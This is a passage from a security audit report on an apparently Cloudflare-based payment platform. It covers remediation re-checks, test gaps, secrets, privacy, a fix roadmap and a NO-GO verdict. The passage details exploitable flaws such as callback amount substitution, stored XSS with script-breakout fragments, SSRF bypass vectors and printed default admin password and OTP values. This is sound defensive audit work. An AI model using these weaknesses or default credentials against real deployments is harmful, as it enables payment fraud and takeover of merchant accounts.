`EDGEPAY_AUDIT_REPORT.md` was read in full; its §5/§6/§10 fix claims were re-verified against the current tree. Status vocabulary per the brief: FIXED / PARTIALLY FIXED / REGRESSED / NOT FIXED / NOT VERIFIABLE.

| Prior finding (their ID) | Claimed fix | Current code (evidence) | Regression test today | Status |
|---|---|---|---|---|
| P0-1 env-isolation (per-env bindings) | full bindings per env | wrangler.jsonc + wrangler.dev/staging.jsonc each declare DB/KV/DO/queues/workflows/ratelimits; dev/staging use placeholder ids | dry-run only | **PARTIALLY FIXED** (placeholders must be replaced before those envs deploy — their own residual-risk table says so) |
| P0-2 payment atomicity (`DB.batch` on createIntent/initiate/complete) | batch all three paths | completeTransaction: batched ✔ (payment.ts:389-399); initiatePayment: batched ✔ (253-262); **createIntent: sequential `run()`s ✘** (108-155) | payment-integrity tests assert paired rows but not atomicity | **REGRESSED / NOT FIXED** for createIntent |
| P0-3 cross-tenant auth override | 403 tenant mismatch in both middlewares | Present and correct (auth.ts:104-108, 160-164) | tenant-routing suite **crashes** (JWT_SECRET missing in test env) | **FIXED (code), REGRESSED (test)** |
| P0-4 domain/maintenance never mounted | mount both globally | Mounted (index.ts:109-110) with documented bypasses | smoke + lane-equivalents | **FIXED** |
| P1-1 deterministic gateway FK + `GatewayNotConfiguredError` | ORDER BY id ASC + typed 422 | Current code **auto-seeds a 'manual' gateway** instead (payment.ts:87-104) — different behavior, races, no 422; `GatewayNotConfiguredError` does not exist in lib/error.ts | none | **NOT FIXED (as claimed)** |
| P1-2 ledger-before-completed | posting first, atomic completed batch | Present (payment.ts:379-399) + payment-integrity tests | ✔ | **FIXED** |
| P1-3 PayPal refund currency | currency_code from param | paypal.gateway.ts refund signature carries currency — consistent with claim | gateway-integrity tests | **FIXED** (not re-verified line-by-line — NOT VERIFIABLE for runtime behavior) |
| P1-4 PayPal webhook correlation | extractor prefers custom_id/invoice_id | webhooks.ts:233-240 prefers `resource.custom` only — **the claimed priority chain is absent** | none | **NOT FIXED** |
| P1-5 Stripe form encoding (bracketed params) | bracketed notation + metadata fields | stripe.gateway.ts uses URLSearchParams with bracketed keys (verified present) | gateway tests | **FIXED** |
| P1-6 token cache env threading | ctx.kv threaded | `GatewayContext { kv }` threaded from PaymentService/webhooks (verified at call sites) | port-kit tests | **FIXED** |
| P1-7 install limiter ordering + wildcard + 3/hour | global prefix middleware, single-charge flag | Middleware mounted `/install*` (index.ts:185) — but the **group config is 120/60s**, not 3/hour; no `__installLimited` flag exists | none | **PARTIALLY FIXED** (ordering fixed; limit value falsified) |
| P1-8 webhook body cap + hash event-id + fail-closed geo | 1 MiB cap, `hash:sha256`, `!country→403` | **None of the three exist** in webhooks.ts (rawBody unbounded; `crypto.randomUUID()` fallback at :159; `else if (cf?.country)` at :109) | none (lane test gone) | **NOT FIXED / REGRESSED** |
| P1-9 outbound webhook retry escalation + Idempotency-Key + delivery id | delay from msg.attempts, stable ids | Consumer uses constant `webhook.attempt` (76-79) → 60s always; no Idempotency-Key/delivery-id headers anywhere | none | **NOT FIXED** |
| P1-10 sanitizeBrandColor | strict `^#[0-9a-fA-F]{6}$` | **Function does not exist**; `merchant?.color` used raw (checkout.ts:62, :321) | none | **NOT FIXED** |
| P2-1 DLQs for email/sms | DLQs in all envs | wrangler.jsonc consumers declare email-out-dlq / sms-parse-dlq | config inspection | **FIXED** |
| P2-4/5 domain cache invalidation both prefixes + normalization | helper deleting `domain:` + `domain-v2:` | `invalidateDomainCache` present in admin-api.ts:21-27 and cron handler — note the **resolver only ever writes `domain:`** (domain.ts:89,137), so v2 deletion is harmless belt-and-braces | tenant-routing (partially broken) | **FIXED** |
| P2-6 domain bypass for install/assets | early bypass before KV | Present (domain.ts:72-80) | smoke | **FIXED** |
| P2-7 refund sweep index | migration 0004 | Present; `EXPLAIN` covered by payment-integrity test | ✔ | **FIXED** |
| P2-9 typed GatewayNotConfiguredError | 422 typed error | Absent from error.ts | none | **NOT FIXED** |
| Residual: SMS matcher stub | documented no-op | The matcher is now the full corroboration pipeline (sms-corroboration.ts) — but with the P0-007 hole on the checkout side | sms-corroboration-edgecases tests | **EVOLVED (partially)** |

**Meta-observation:** the prior report's §9 "Validation Evidence" cites test files (`lane1/lane3/lane4`) and a `wrangler.toml` that do not exist in this archive — either the archive predates those fixes being committed, or the fixes were reverted during the jsonc/test restructure. Either way, **the prior audit's remediation claims cannot be trusted as a description of this tree**, which validates the briefs' insistence on re-verification. The claims that matter most for money (webhook hardening, brand-color sanitization, install throttling, createIntent atomicity) are exactly the ones that are absent.

---

# 23. Test Quality Audit & Test Gap Report

## 23.1 Inventory & quality assessment

21 files, 212 tests (207 pass, 5 skip, 1 suite crash). Suite-by-suite judgment:

| Suite | Tests | Quality judgment |
|---|---|---|
| ledger-do.test.ts | 14 | **Excellent** — fault injection at D/E/F boundaries, dedup, balance guard, trial balance, input-gate behavior. Genuinely exercises the security boundary. |
| ledger-consistency.test.ts | 11 | Good — DO-vs-mirror property, posting-idempotency under replay. |
| payment-integrity.test.ts | 7 | Good — paired rows, idempotent completion, EXPLAIN-index assertion. Missing: callback amount/binding, late-failing callback. |
| tenant-routing.test.ts | ~14 | **BROKEN at setup** (JWT_SECRET) — the API-key mismatch tests that do run are valuable; JWT-side untested. |
| access-jwt.test.ts | ~12 | Good — alg pinning, iss/aud/exp, kid rotation, break-glass deny. |
| api-middleware.test.ts | ~10 | Good — CORS allow/deny, auth envelope, rate-limit headers. |
| jwt.test.ts | 10 | Good — HS256 pin, aud, expiry, weak-secret rejection. |
| money.test.ts | 8 | Good — 0.1+0.2, 2^53 guard, string round-trips. |
| sms-corroboration-edgecases / sms-parser-adversarial | 9+9 | Good — ambiguity, case, unicode digits, amount mismatch. **Do not cover the checkout-side NULL-amount hole (P0-007).** |
| gateways/bd-gateways/catalog-port/port-kit/gateway-integrity/gateways-enabled | ~50 | Good — metadata pinning, md5 vectors, enabled-parser fail-closed, refund-unsupported posture. |
| payment-edgecases / runtime-integrity / workflow-policy / smoke / api-reference / bd-gateways | ~25 | Mixed — smoke covers boot/404/CORS; workflow-policy pins the poll schedule; runtime-integrity checks dead config (catches the csrf/AI drift). |
| idempotency | (none dedicated) | **Gap** — middleware has zero direct tests (no race, no cross-endpoint, no 4xx-no-cache). |

## 23.2 Do the tests exercise the security boundaries? (brief's question battery)

- Failure behavior: ✔ ledger only. Concurrency: ✔ DO only. Cross-tenant: partial (suite broken). Replay: ✘ (webhook replay untested). Duplicate delivery: ✘. **The majority of this audit's P0/P1 findings have no test today — which is why they survived.**

## 23.3 Test gap register (priority-ordered; per the brief's gap-report format)

| # | Risk | Files | Scenario | Expected invariant | Test type | Priority |
|---|---|---|---|---|---|---|
| G1 | Payment substitution fraud | payment.ts, checkout.ts, bkash/sslcommerz adapters | callback with foreign paymentID/val_id, amount≠intent | 422 + no completion + no ledger row | integration (SELF.fetch) | **P0** |
| G2 | SMS amount bypass | checkout.ts, sms-consumer.ts | SMS row parsed_amount NULL + TrxID submit | 400, no ledger row | integration | **P0** |
| G3 | Refund ledger correctness | refund-reconciliation.ts, ledger.ts | refund → correct ledger tx reversed, refund amount, once | exactly one reversal of correct amount | workflow integration | **P0** |
| G4 | Refund bounds | api.ts, refund.ts | over-refund, cumulative refunds | 422 | route integration | **P0** |
| G5 | Default credentials | bootstrap.ts, install.ts | fresh env; bootstrap-key with default password | 401; OTP random | integration | **P0** |
| G6 | Checkout XSS | checkout.ts | adversarial color/account_number/instructions | no `</style><script`, no `'` breakout, CSP present | render assertion + DOM | **P0** |
| G7 | Idempotency race | idempotency.ts | 20 parallel same key | one side effect | concurrency | P1 |
| G8 | Pairing brute force | mobile.ts, rate-limit.ts | 11 OTP guesses | 429 + lockout | integration | P1 |
| G9 | Webhook size/replay/geo | webhooks.ts | 2 MiB body; id-less replay; missing cf | 413 / duplicate / 403 | integration | P1 |
| G10 | SSRF vectors | webhook-consumer.ts | IPv6 ULA, mapped, integer, redirect | blocked_ssrf + ack | unit table + integration | P1 |
| G11 | Status regression | payment.ts | failing callback after completion | stays completed | integration | P1 |
| G12 | Scope matrix | api.ts | read-key × POST routes | 403 | route matrix | P1 |
| G13 | Platform-merchant provisioning authz | admin-api.ts | merchant-admin key | 403 | integration | P1 |
| G14 | createIntent atomicity | payment.ts | fault between inserts | 0 rows | fault-injection | P1 |
| G15 | Reconciliation heals payment rows | reconciliation.ts (future fix) | posted ledger + stuck intent | intent completed + webhook once | integration | P1 |
| G16 | Outbox/delivery id | webhook-dispatcher/consumer | duplicate delivery | same Idempotency-Key | unit | P2 |
| G17 | Prefix collision | auth.ts + migration | duplicate key_prefix | constraint error | migration test | P2 |
| G18 | KV limiter race | rate-limit.ts | parallel burst | cap respected (±tolerance) | concurrency | P2 |
| G19 | ReDoS templates | sms-parser.ts | evil regex + long SMS | bounded time | unit timeout | P2 |
| G20 | JWT_SECRET in test env | vitest.config.ts | suite runs | 0 failed suites | CI gate | **P0 (process)** |

## 23.4 Property-based & fuzz recommendations (brief's Phase 38/39)

- **Ledger properties (extend the existing suite):** randomized entry multisets ⇒ always balanced, never negative, replay-stable; already half-present, formalize with fast-check over amount/partition generators.
- **State-machine fuzz:** random sequences over {create, initiate, callback-success, callback-fail, webhook, sms, expire, refund, sweep} asserting invariants: no completed-without-posting; failed never precedes ledger; refund totals ≤ captured; no state leaves `completed`.
- **Idempotency fuzz:** random (key, body, concurrency) tuples ⇒ exactly-once side effects.

---

# 24. Supply-Chain Audit

- `npm audit --audit-level=high`: **0 vulnerabilities** (6 direct runtime deps; 209 total packages).
- Runtime-reachable packages: `hono` (HTTP), `zod` (+`@hono/zod-validator`) (validation), `decimal.js` (money), `jose` (JWT), `@scalar/hono-api-reference` (dev-doc rendering — ships HTML/CDN-pinned assets; verify its CSP claim if exposed publicly).
- Dev-only: wrangler/vitest/workers-types/eslint/prettier/typescript — not bundled into the Worker (esbuild tree-shakes imports; `main: src/index.ts` pulls only hono+zod+decimal+jose+@hono/*).
- `allowScripts` in package.json pins esbuild/workerd postinstall versions — a deliberate supply-chain control (good).
- No `postinstall` scripts from third parties; lockfile committed (package-lock.json present, consistent).
- **The real supply-chain risk in this repo is not npm — it is the committed credentials (P0-001) and the deploy-button provisioning model (auto-bootstrap P0-005).** Per the brief: npm audit findings would not have been the dangerous bugs here; that prediction held (zero npm findings, seven P0 code findings).

---

# 25. Secrets, Configuration & Deployment Safety

## 25.1 Secrets inventory (redacted)

| Secret | Where found | Exposure |
|---|---|---|
| `op_live_9e9b…` (full live key) | scripts/verify-adversarial.mjs:3, verify-all-roles.mjs:4, verify-corroboration.mjs | **Committed. Rotate.** (P0-001) |
| `JWT_SECRET` 64-hex | same three scripts | **Committed. Rotate.** (P0-001) |
| `AdminPass123456!` (default) | src/services/bootstrap.ts:68 (hashed at rest; literal in source) | Knowable → bootstrap-key chain (P0-005) |
| Pairing OTP `123456` | bootstrap.ts:39, install.ts:239 | Knowable (P0-005) |
| Root API key | KV `system:root_api_key` plaintext | Any KV-reader exfiltrates (P0-005) |
| Webhook signing secrets | op_webhooks.secret plaintext in D1; returned by provisioning endpoints | D1-reader/`POST /merchants` harvest (P1-005) |
| Gateway credentials | AES-256-GCM in op_gateway_configs | Sound at rest; single-key blast radius (P2-010) |
| ENCRYPTION_KEY / APP_KEY / JWT_SECRET (deployment) | wrangler secret put / .dev.vars | Correct posture documented; `.dev.vars` gitignored ✔; `.dev.vars.example` carries no values ✔ |

## 25.2 Configuration safety (dev vs staging vs production)

| Check | Prod (wrangler.jsonc) | Dev | Staging | Risk |
|---|---|---|---|---|
| ENVIRONMENT | production | development | staging | ✔ distinct |
| D1 database_id | real-looking id | `0000…0001` placeholder | `0000…0002` placeholder | deploying dev/staging without replacement writes to wrong/nonexistent DB (prior report flagged; still placeholders) |
| KV id | real-looking | `000…0001` | `000…0002` | same |
| ENABLED_GATEWAYS | 9-slug list | (file truncated in audit — dev config mirrors prod pattern) | mirrors | unset⇒all (P2-016) |
| ALLOWED_ORIGINS | documented default `""` (fail-closed CORS) | test value | — | the test value is also the DO fault-injection magic value (P2-002) |
| Observability | logs 100%, traces 1% | same | same | cost at scale (prior report's residual item — unchanged) |
| Secrets | via setup page / secret put | `.dev.vars` | secret put | ✔ |

**Recommended `validate:production-config` gate (adopting the briefs' suggestion):** a pre-deploy script asserting: ENVIRONMENT=production; the three secrets present and length-valid; `system:root_api_key` absent from KV; no merchant user verifies against the default password; ENABLED_GATEWAYS non-empty and parses; D1/KV ids ≠ placeholder patterns; RATE_LIMIT bindings resolvable — failing the deploy otherwise.

## 25.3 Deployment ordering & rollback

- `npm run deploy` = `wrangler d1 migrations apply DB --remote && wrangler deploy` — correct order.
- Migrations 0001–0004 are additive & idempotent (`IF NOT EXISTS`, `ALTER ADD`) — expand/contract compatible both directions; rollback to the previous Worker version against the new schema is safe (new columns are nullable/defaulted).
- The `[migrations]` DO tag `v1` matches the only class — no DO migration hazard.
- Rollback story for the **ledger** is the reconciliation replay; for refunds, none (P0-002 makes rollback semantics meaningless until fixed).

---

# 26. Data Retention & Privacy

**Stored sensitive data inventory:**

| Data | Storage | Retention | Encryption | Deletion |
|---|---|---|---|---|
| Customer name/email/phone (create-intent input) | op_payment_intents.metadata (JSON), transactions metadata | indefinite | none | none (merchant delete cascades only on merchant deletion) |
| Raw SMS bodies (contain sender phone + balances) | op_sms_data.body, op_sms_parsed | indefinite | none | none |
| Raw webhook payloads | op_webhook_events.payload | indefinite | none | none |
| Checkout tokens | op_payment_intents.token (unique) | indefinite | n/a (bearer for the payment page) | none |
| IP addresses | rate-limit KV keys (TTL = window), login-attempt table (unused in CF port) | short/none | n/a | KV TTL ✔ |
| Gateway credentials | op_gateway_configs | indefinite | AES-256-GCM ✔ | via admin (untested path) |
| Merchant emails | op_merchants/op_merchant_users | indefinite | email_hash indexed variant ✔ | cascade |

**Findings:** no retention policy, no PII minimization on metadata (customer object stored verbatim into intent metadata), no right-to-erasure path, and unbounded raw-payload growth (ties into P1-003's missing size cap — D1 row bloat is also a cost/DoS vector on the free-tier 5 GB cap). Recommend: retention columns + a cron sweep (e.g. webhook events > 90d, SMS > 180d, completed-intent metadata stripped to ids), and a documented erasure procedure per merchant. Severity: P2/P3 (privacy compliance debt — P2 if BD/EU merchants process personal data under law).

---

# 27. Observability & Audit Logging

**Logging:** structured JSON with request_id on every error (lib/error.ts:105-116); access logs via hono logger; `page()` channel emits console.error level=page + optional AE datapoint — reconciliation drift, exhausted postings, stuck refunds, break-glass, spoofed Access email all page. ✔

**Metrics:** designed (metric() with merchant/gateway dims) but **inert by default** (ANALYTICS commented out — P2-006). Named metrics cover: sms parse-miss/confirmed/manual-review, webhook ip/geo/signature rejections, webhook lag, rate-limit hits/degraded, ledger posting healed, reconciliation run counts. Missing vs the briefs' list: `payments_created/completed/failed_total`, `ledger_post_failures_total`, `trial_balance_failures_total`, `duplicate_post_attempts_total`, `idempotency_conflicts_total`, `queue_dlq_total`, `authentication_failures_total`, `cross_tenant_denials_total` — half the recommended financial-integrity metric set is absent.

**Tracing:** Workers Traces enabled at 1% (wrangler observability block) — the only true tracing signal; no correlation of queue-consumer work back to the originating request id (webhook messages carry no traceparent) — the async half of every payment is untraceable end-to-end.

**Audit trail (who did what):** op_audit_logs table exists (schema 0001:533-549) with entity/index columns — **but no code path writes to it** (verified by grep across src/). Admin actions (provisioning, refunds, template edits, device deletion) produce no immutable audit records; repudiation risk is real (STRIDE R ●). The postings/reconciliation runs partially compensate for financial actions, not for administrative ones.

**Sensitive-data-in-logs check (briefs' Phase 25):** grep for console.* with key/secret/password/token patterns → zero hits in src/ (✔); error messages are clipped (512) and URLs redacted in the gateway kit (✔); the access-JWT failures log only error names, not tokens (✔). The scripts/*.mjs logs print derived data, not the secrets themselves (moot — the secrets are in the same files).


---

# 28. Improvement Audits (Architecture / Data Integrity / Stability)

## 28.1 Architecture improvements (brief §34/40 — concrete, not fashionable)

| # | Improvement | What it changes in EdgePay | Why (evidence-backed) | Complexity | Priority |
|---|---|---|---|---|---|
| A1 | **Single confirmation gate for all completion paths** — a `confirmPayment(intentId, {source, providerRef, amount, orderRef})` service that validates amount+binding, then calls completeTransaction | payment.ts handleCallback, webhooks.ts completion, sms-consumer, checkout verify | three paths, three validation postures today; P0-004 and P0-007 both live in the gaps between them | M | **Immediate** |
| A2 | **One refund path** (delete inline api.ts handler; RefundService only) with DB-enforced bounds and ledger-tx-by-key reversal | api.ts:147-256, refund-reconciliation.ts:183 | two divergent implementations is how P0-002/003 coexist | M | **Immediate** |
| A3 | **Outbox for merchant notifications** — `op_webhook_outbox` written in the completion D1 batch, drained by cron/consumer with delivery ids | payment.ts:401-415, dispatcher | crash window loses webhooks today (P2-007); gives receivers dedup keys (P1-004) | M | Near-term |
| A4 | **Typed state-machine module** — `assertTransition(from,to)` called at every status write; statuses pruned to the implemented set | payment.ts, cron/handler.ts, checkout.ts | illegal transitions are the root of P1-006; dead states (P3-001) confuse ops | S | Near-term |
| A5 | **Deduplicate the SMS decision logic** — checkout verify routes through `corroborateSmsPayment` (or consumer-only confirmation) | checkout.ts:166-222 | P0-007 is a shadow copy of the strict gate | S | **Immediate** |
| A6 | **Negative-cache the domain resolution** (KV null marker, 60s) + cache `system:installed`/`bootstrapped` per isolate | domain.ts:83-104, index.ts:88-106 | one KV read per request today; unknown-host floods hit D1 | S | Near-term |
| A7 | **Per-merchant DO id assertion** (payload.merchant_id vs ctx.id.name) | ledger-do.ts | cross-tenant defense-in-depth (P2-012) | S | Near-term |
| A8 | **Explicit `TEST_MODE` secret** decoupled from ALLOWED_ORIGINS for all test seams | ledger-do.ts:383, vitest config | magic-env coupling (P2-002) | S | Near-term |
| A9 | **Unknown-outcome state for gateway verifications** (`verify_timeout` → status `pending_review` + reconciliation probe) | payment.ts handleCallback + adapters | timeout≠failed (brief's explicit requirement; stability verdict) | M | Strategic |
| A10 | **Secret versioning + rotation runbook** (envelope v2, lazy re-encrypt) | crypto.ts, gateway configs | P2-010; mandatory after P0-001 rotation | M | Near-term |

## 28.2 Data-integrity improvements (move guarantees from code to DB)

| # | Constraint | Migration note | Invariant protected |
|---|---|---|---|
| D1 | `CHECK (CAST(amount AS REAL) >= 0)` or better: store minor-unit INTEGER column alongside TEXT for validation | expand-only: add generated column `amount_minor INTEGER GENERATED ALWAYS AS …` (SQLite supports; D1 caveat: test) — non-breaking | no negative/zero amounts at rest |
| D2 | `UNIQUE (merchant_id, slug)` on op_gateways | requires dedup of existing duplicates first (deploy script step) | kills the seed race (P1-007) |
| D3 | `UNIQUE (key_prefix)` on op_api_keys | trivial | auth determinism (P2-013) |
| D4 | `op_refunds`: add `remaining_guard` — either a trigger computing `SUM(refunds) <= tx.amount` or an application check + `UNIQUE(transaction_id, idempotency_key)`; minimum: `CHECK (amount > 0)` + FK to transactions with `ON DELETE RESTRICT` | trigger + backfill check; reversible | refund ≤ captured (P0-003) |
| D5 | State-transition guard: `status` transitions via a small `op_status_audit` + BEFORE UPDATE trigger rejecting `completed→failed/processing` | trigger is the only airtight guard once many call sites exist | P1-006 |
| D6 | `op_ledger_entries`: add `entry_index` and `UNIQUE(ledger_transaction_id, entry_index)` replacing the 4-tuple NOT-EXISTS | additive column + unique index (backfill index values by existing order) | mirror fidelity (P2-008) |
| D7 | `op_webhook_events`: `event_id TEXT NOT NULL` (drop the app-side random fallback) + partial index for replay lookup | schema already NOT NULL? — verify: column is NOT NULL, the *value* is random; fix is app-side deterministic hash | replay dedup (P1-003) |
| D8 | Payment→ledger FK: `op_ledger_postings.reference_id` ↔ intents; add `op_ledger_transactions.reference_id` index (exists) + reconciliation JOIN assertion | exists mostly; formalize the heal query | P1-006 healing |

## 28.3 Stability improvements

1. **Add timeouts to every external fetch** (JWKS, exchange rates, update check, DNS verification, custom-hostnames) — 5–10s AbortController; today only gateway + outbound-webhook calls are timed.
2. **Escalating retry delays from `msg.attempts`** (the runtime-provided counter) in webhook-consumer; terminal-ize 400/401/403/404.
3. **Payment-row healing in the sweep** (joins D8): posted ledger + non-completed intent ⇒ complete + re-dispatch (with outbox/delivery id making it exactly-once).
4. **Cap all public inputs** (body bytes, batch arrays, pagination offsets).
5. **Queue-depth alarms** (webhook-out-dlq > 0; sms-parse backlog age) — needs the ANALYTICS binding enabled (P2-006) or Workers Logs alerts.
6. **ReDoS-safe template writes** (validator at PUT /sms-templates).
7. **Jitter on cron sweeps** to avoid synchronized DO storms after multi-region cold starts (minor at current scale).

**Top failure mode likely to occur in production first** (brief's explicit ask): a bKash/SSLCommerz callback that times out **after** the provider executed → transaction marked `failed` while money moved → merchant support escalates → operator "fixes" by re-payment and the books drift (no unknown state, no heal). Second: the EDGE-P0-007 NULL-amount SMS completion corrupting revenue on the first SMS-format drift.

---

# 29. Remediation Roadmap

## 29.1 DO NOW — P0 (before any production money; all require regression tests from their findings)

| ID | Fix (file → change) | Why | Risk reduced | Migration? |
|---|---|---|---|---|
| P0-001 | scripts/*.mjs → env vars; **rotate JWT_SECRET + revoke the key + purge KV system:root_api_key**; add gitleaks CI | live credentials in-tree | full platform compromise | no |
| P0-002 | refund-reconciliation.ts:183 → resolve ledger tx by `uuid='m'||merchant||':payment:'||intent`; typed reverse() result (no string-match swallow); post refund-amount entries | wrong/absent reversal | ledger corruption | no |
| P0-003 | api.ts:147-256 → delegate to RefundService; enforce amount ≤ captured − refunded (SQL) → 422 | unbounded refunds, no reversal | double spend / overstated revenue | optional D4 |
| P0-004 | payment.ts handleCallback (+ webhook path) → compare `verifyResult.amount` to `tx.amount` and `verifyResult.trx_id` to `tx.trx_id`; store provider session ids at initiate | intent/amount substitution | goods shipped unpaid | no |
| P0-005 | bootstrap.ts → random admin password/OTP (returned once), drop KV root key; gate/lockout `/install/bootstrap-key`; install limiter 3/h | default credentials | root takeover | no |
| P0-006 | checkout.ts → sanitizeBrandColor, data-* + addEventListener (no inline string args), CSP-with-nonce on HTML routes | stored XSS on payment page | customer data capture, page forgery | no |
| P0-007 | checkout.ts:166-191 → mandatory parsed_amount + restrict match_status; share corroborateSmsPayment | amount-less completion | fake payments | no |

## 29.2 NEXT — P1 (before broad rollout)

| ID | Fix | Migration? |
|---|---|---|
| P1-001 | idempotency: reserve-row (in_progress) + endpoint in key + poll/conflict semantics | yes (unique index change) |
| P1-002 | mount otp limiter on pair/refresh; attempt lockout; crypto-random OTPs | no |
| P1-003 | webhook: 1 MiB cap (413), deterministic event-id fallback, fail-closed geo, per-IP group | no |
| P1-004 | SSRF: manual redirects + re-validate hops; IPv6/mapped/integer canonicalization; Idempotency-Key + delivery id; escalating delays | no |
| P1-005 | platform-admin gate on /merchants + /reconcile; no secrets in provisioning responses | no |
| P1-006 | status guards on all terminal writes; sweep heals payment rows + re-dispatch | no |
| P1-007 | createIntent DB.batch; UNIQUE(merchant_id,slug) + INSERT OR IGNORE; typed 422 when no gateway | yes (D2) |
| P1-008 | requireScope('write') on all mutating /api/v1 routes | no |
| P1-009 | vitest JWT_SECRET binding + eslint.config.js + CI gates | no |
| P1-010 | install 3/h; mount otp/password groups; bucket-key counter | no |

## 29.3 HARDEN — P2 (scheduled)

Body/array caps (P2-014); webhook storage cap + retention sweep; SSRF table tests; key versioning + rotation (P2-010); PBKDF2 600K + comment truth (P2-017); decrypt-failure paging (P2-009); JWKS timeout + timing-safe break-glass (P2-011); platform merchant in verification (P2-003); webhook merchant resolution by trx_id (P2-004); outbox (P2-007 → A3); mirror entry_index (P2-008 → D6); amount ceiling (P2-018); currency exponent table (P2-019); exchange-rate validation (P2-020); enable ANALYTICS + alert rules (P2-006); rate-limit fail-closed on writes (P2-005); ENABLED_GATEWAYS explicit (P2-016); DO self-check (P2-012); prefix unique (P2-013 → D3); fault-seam TEST_MODE (P2-002); CSRF decision (mount or delete, P2-001); ReDoS validation (P2-015).

## 29.4 OPTIONAL — P3

Dead-state cleanup; mobile subject/device fix; notification-ack scoping; last_insert_rowid; maintenance-reason escaping; mockup proxy lockdown; secretToBytes explicitness; payload_hash real hash; 4xx retry semantics; docs regeneration; audit-log writes for admin actions (arguably P2 — repudiation).

## 29.5 Acceptance battery (run before declaring any P0 fixed)

Per the briefs' patch-acceptance criteria, a fix is complete only when: the failure is reproducible (or proven) pre-fix; the new regression test fails pre-fix; passes post-fix; the full suite + typecheck pass; and for money fixes — no duplicate posting, ledger balances, retry-safe, reconciliation-correct (rerun `ledger-do`, `payment-integrity`, `ledger-consistency`, `gateway-integrity`, plus the new tests G1–G6). CI must run typecheck + lint + test as separate required jobs (fixing EDGE-P1-009 first).

---

# 30. Final Verdict

## Verdict: **NOT PRODUCTION READY — NO-GO**

Blocks, exactly as the brief requires them stated:

1. **Money integrity** — refunds corrupt or skip the ledger on every invocation (P0-002), are unbounded (P0-003); payments can complete at attacker-influenced values via unbound callbacks (P0-004) and amount-less SMS matches (P0-007).
2. **Authentication / secret compromise** — live platform credentials are committed to the repository (P0-001); default bootstrap credentials mint root keys on any un-rotated deployment (P0-005).
3. **Tenant boundary / platform privilege** — merchant-admin keys enumerate and provision tenants and harvest their secrets (P1-005, chained from P0-001).
4. **Recoverability** — reconciliation heals the ledger only; payments stick, notifications vanish, refund reversals never converge (P1-006, P2-007, P0-002).

The ledger core itself — the posting protocol, the DO serialization, the invariants, and their tests — is genuinely production-grade and should be **kept as the foundation**. The recommendation is not a rewrite; it is the 7-item DO-NOW list (three of which — P0-002, P0-004, P0-007 — are small, surgical, fully testable patches against code this audit has already pinned to lines).

**Re-audit trigger:** after the DO-NOW list lands with the G1–G6 regression tests green, re-run this audit's §17 matrix and §21 battery; expect the verdict to move to CONDITIONAL (P1 remainder) — production with real money should additionally clear §29.2.

---

# Appendix A — Finding Index

| ID | Sev | Title | File anchor |
|---|---|---|---|
| EDGE-P0-001 | P0 | Live API key + JWT secret committed | scripts/verify-*.mjs |
| EDGE-P0-002 | P0 | Refund workflow reverses wrong/absent ledger tx (ID-space confusion) | refund-reconciliation.ts:183 |
| EDGE-P0-003 | P0 | API refund path unbounded, no ledger reversal | api.ts:147-256 |
| EDGE-P0-004 | P0 | Callback completion ignores amount & intent binding | payment.ts:271-324 |
| EDGE-P0-005 | P0 | Bootstrap default credentials → root key | bootstrap.ts:37-229, install.ts:269-317 |
| EDGE-P0-006 | P0 | Checkout stored XSS (brandColor + onclick) w/o CSP | checkout.ts:321/598, index.ts:160 |
| EDGE-P0-007 | P0 | SMS completion bypasses amount when parsed_amount NULL | checkout.ts:166-191 |
| EDGE-P1-001 | P1 | Idempotency race + non-endpoint-scoped keys | idempotency.ts:42-179 |
| EDGE-P1-002 | P1 | Pairing OTP brute-force (no rate limit, Math.random, default OTP) | mobile.ts:18-94 |
| EDGE-P1-003 | P1 | Webhook: no size cap, random event ids, fail-open geo | webhooks.ts:100-198 |
| EDGE-P1-004 | P1 | Outbound SSRF bypass vectors; no delivery idempotency | webhook-consumer.ts:119-166 |
| EDGE-P1-005 | P1 | Merchant-admin → all-tenant list + tenant provisioning | admin-api.ts:247-403 |
| EDGE-P1-006 | P1 | Unguarded status writes; no payment-row healing | payment.ts:317-321 etc. |
| EDGE-P1-007 | P1 | createIntent non-atomic; gateway seed race | payment.ts:87-155 |
| EDGE-P1-008 | P1 | Read-scope keys can write (payments, webhooks) | api.ts:24,346-394 |
| EDGE-P1-009 | P1 | Security regression suite broken; lint unrunnable | vitest.config.ts, tenant-routing.test.ts |
| EDGE-P1-010 | P1 | Install limiter 120/min; KV counter race; anon surfaces unthrottled | rate-limit.ts:33-40,106-150 |
| EDGE-P2-001..020 | P2 | See §12 | — |
| EDGE-P3-001..012 | P3 | See §13 | — |

# Appendix B — Audit Discipline Checklist

```
[x] reconstructed request architecture (§5.1)
[x] reconstructed payment state machine (§7)
[x] reconstructed ledger invariants (§8)
[x] inspected migrations (§2.3, §8, §22, §25.3)
[x] audited tenant isolation (§14, matrix #4, Q6)
[x] reviewed payment.ts completely (§9.2)
[x] reviewed ledger-do.ts completely (§9.3)
[x] reviewed auth.ts completely (§9.4)
[x] reviewed cloudflare-access.ts completely (§9.5)
[x] reviewed webhooks.ts completely (§9.6)
[x] reviewed crypto.ts completely (§9.7)
[x] tested idempotency (reasoned + gap tests G7; existing suite absent)
[x] tested concurrency (DO property tests pass; middleware races identified)
[x] tested replay (webhook/SMS replay paths analyzed; gaps G2/G9)
[x] tested duplicate queue delivery (analysis; gap G12)
[x] tested cross-tenant access (matrix #4; suite broken → G13/G20)
[x] tested failure paths (ledger fault injection ✔; product-layer gaps G11/G15)
[x] reviewed secrets/config (§25)
[x] reviewed gateway/SSRF behavior (§9.6, P1-004)
[x] reviewed bootstrap security (P0-005)
[x] reviewed previous audit remediations (§22)
[x] ran all relevant tests (§2.1, §2.2)
[x] added missing regression tests where justified → specified as required tests per finding + §23.3 register (no repo mutation per audit rules)
[x] produced P0/P1 findings with evidence (§10-§11)
[x] produced remediation roadmap (§29)
[x] produced final production-readiness verdict (§30)
```

# Appendix C — Evidence Transcript (key commands & outputs)

```
$ npm install                      → added 209 packages in 8s
$ npx tsc --noEmit                 → (no output; exit 0)
$ npm run lint                     → ESLint couldn't find a eslint.config.(js|mjs|cjs) file.  (exit ≠0)
$ npm audit --audit-level=high     → found 0 vulnerabilities
$ npm test                         → Test Files  1 failed | 20 passed (21)
                                     Tests  207 passed | 5 skipped (212)
                                     FAIL tests/tenant-routing.test.ts > authenticated tenant mismatch:
                                       TypeError: Cannot read properties of undefined (reading 'length')
                                       ❯ new JwtService src/lib/jwt.ts:63:16  (env.JWT_SECRET undefined)
$ npx vitest run tests/ledger-do.test.ts tests/payment-integrity.test.ts tests/ledger-consistency.test.ts
                                   → 3 files / 25 tests passed
$ npx vitest run tests/access-jwt.test.ts tests/api-middleware.test.ts tests/jwt.test.ts
